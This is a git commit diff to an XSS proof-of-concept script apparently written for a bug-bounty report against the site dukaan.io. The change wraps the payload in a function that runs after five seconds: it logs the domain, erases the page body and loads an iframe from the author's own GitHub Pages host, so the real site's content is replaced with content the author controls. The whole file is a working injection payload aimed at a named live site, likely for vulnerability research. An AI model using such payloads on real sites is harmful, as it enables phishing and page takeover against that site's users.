c36c1a28d95a97b5cd0238b3600646bbc1f619c9
Khara-h1 <117389489+Khara-h1@users.noreply.github.com>
2023-12-28 01:30:02 +0100

    Update xss.js

--- poc/dukaan.io/xss.js
+++ poc/dukaan.io/xss.js
@@ -1,8 +1,11 @@
 console.log(">>>>>>>>>>>> DOMAIN IS :" + document.domain);
-a=document.createElement("iframe");
-a.src="https://khara-h1.github.io/poc/dukaan.io/index.html";
-a.name="mainsite";
-a.width="100%";
-a.height="700px";
-document.body.innerHTML="";
-document.body.appendChild(a);
+function injection(){
+  a=document.createElement("iframe");
+  a.src="https://khara-h1.github.io/poc/dukaan.io/index.html";
+  a.name="mainsite";
+  a.width="100%";
+  a.height="700px";
+  document.body.innerHTML="";
+  document.body.appendChild(a);
+}
+setTimeout(injection, 5000);
